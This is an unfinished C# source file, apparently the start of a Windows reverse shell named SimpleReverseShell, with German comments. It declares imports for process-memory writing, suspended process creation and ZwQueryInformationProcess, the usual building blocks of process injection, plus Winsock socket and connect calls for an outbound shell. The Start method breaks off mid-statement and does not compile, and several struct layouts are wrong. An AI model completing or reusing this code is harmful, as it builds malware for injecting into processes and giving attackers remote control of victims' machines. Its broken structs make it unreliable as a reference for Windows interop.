﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SimpleReverseShell
{
  internal class SimpleSysCallShell
  {
    #region MemoryManagement
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public Int32 dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }
    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
    }
    public const int PROCESSBASICINFORMATION = 0;
    #endregion

    #region Sockets
    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// </summary>
    /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
    /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
    /// <param name="protocol">Protokoll. Wert von 6 entspricht tcp.</param>
    /// <param name="protocolInfo">Kann NULL sein.</param>
    /// <param name="group">Kann NULL sein.</param>
    /// <param name="dwFlags">Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern SOCKET WSASocketA(int af, int type, int protocol, WSAPROTOCOL_INFOA protocolInfo, int group, int dwFlags);

    [DllImport("Ws2_32.dll")]
    public static extern int connect(SOCKET socket, IntPtr name, int namelen);

    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAPROTOCOL_INFOA
    {
      int dwServiceFlags1;
      int dwServiceFlags2;
      int dwServiceFlags3;
      int dwServiceFlags4;
      int dwProviderFlags;
      Guid ProviderId;
      int dwCatalogEntryId;
      WSAPROTOCOLCHAIN ProtocolChain;
      int iVersion;
      int iAddressFamily;
      int iMaxSockAddr;
      int iMinSockAddr;
      int iSocketType;
      int iProtocol;
      int iProtocolMaxOffset;
      int iNetworkByteOrder;
      int iSecurityScheme;
      int dwMessageSize;
      int dwProviderReserved;
      char szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAPROTOCOLCHAIN
    {
      int ChainLen;
      int ChainEntries;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct SOCKET
    {
      int af;
      int type;
      int protocol;
    }

    /// <summary>
    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SockAddr_In
    {
      ulong S_addr;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct SockAddr
    {
      ushort sa_family;

    }

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in
    /// Address family immer 2 (IPv4).
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SocketAddress
    {
      int af;
      ushort port;
      SockAddr_In in_addr;
      char[] sin_zero;
    }

    #endregion

    public void Start()
    {
      var protcolInfo = new WSAPROTOCOL_INFOA();
      var socketAddress = new SocketAddress();
      socketAddress.
      var socket = WSASocketA(2, 1, 6, protcolInfo, 0, 0);

    }
  }
}
